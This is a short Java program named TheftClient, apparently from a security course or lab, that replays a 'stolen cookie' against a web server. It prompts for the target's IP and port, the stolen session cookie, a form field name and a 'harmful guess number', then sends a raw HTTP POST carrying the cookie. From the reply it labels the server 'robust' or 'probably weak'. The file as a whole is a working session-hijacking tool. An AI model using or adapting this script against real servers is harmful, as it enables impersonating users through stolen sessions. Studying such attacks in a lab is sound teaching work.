import java.net.*;
import java.util.*;
import java.io.*;

class Response{
    HashMap<String, String> headers;
    String startLine;
    String payload;

    Response(String startLine, HashMap<String, String> headers,String payload){
        this.startLine = startLine;
        this.headers=headers;
        this.payload=payload;
    }


    public String getPayload(){
        return payload;
    }

    public String getHeader(String header){
        return headers.get(header);
    }


    public String toString(){
        String ut="";
        for (String key:headers.keySet()){
            ut+=headers.get(key);
        }
        return ut+" "+payload;

    }

}
public class TheftClient{

    public static String readPayload(BufferedReader scktIn,int contentLength)throws IOException{
        char[] cbuf=new char[contentLength];
        scktIn.read(cbuf, 0, contentLength);
        return new String(cbuf);
    }
    public static Response getResponse(BufferedReader scktIn)throws Exception{
        String startLine=scktIn.readLine();
        int bytes=0;
        HashMap<String, String> headers=new HashMap<String,String>();
        String payload = "";
        String line=scktIn.readLine();
        if(line==null)
            return null;
        while ( !line.equals("")){
            String[] lineSplit=line.split(": ",2);
            headers.put(lineSplit[0],lineSplit[1]);
            line=scktIn.readLine();
        }
        int content_length= Integer.parseInt(headers.get("Content-Length"));
        payload=readPayload(scktIn,content_length);
        Response resp=new Response(startLine,headers, payload);
        return resp;
    }


    public static void main(String[] args){
        Scanner myReader = new Scanner(System.in);
        System.out.print("Enter the servers IP-address: ");
        String ip_address = myReader.nextLine();
        System.out.print("Enter the port number: ");
        int port = Integer.parseInt(myReader.nextLine());
        System.out.print("Enter the stolen cookie: ");
        String stolen_cookie =myReader.nextLine();
        System.out.print("Enter the name of the input-html-tag: ");
        String input_name =myReader.nextLine();
        System.out.print("Enter the harmful guess number: ");
        String harmful_guess_number =myReader.nextLine();

        try{
            Socket socket=new Socket(ip_address,port);
            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            BufferedWriter out = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()));

            String content=input_name+"="+harmful_guess_number;
            String request="POST / HTTP/1.1\nCookie: "+stolen_cookie+"\nContent-Length: "+content.length()+"\n\n"+content;
            out.write(request);
            out.flush();
            String line;
            line=in.readLine();
            Response resp=null;
            resp=getResponse(in);
            if (resp==null)
                System.out.println("Robust server!");
            else
                System.out.println("Probabely a weak server!");

        } catch (Exception e) {
            System.out.println("Somthing has gone wrong!");
        }
    }
}
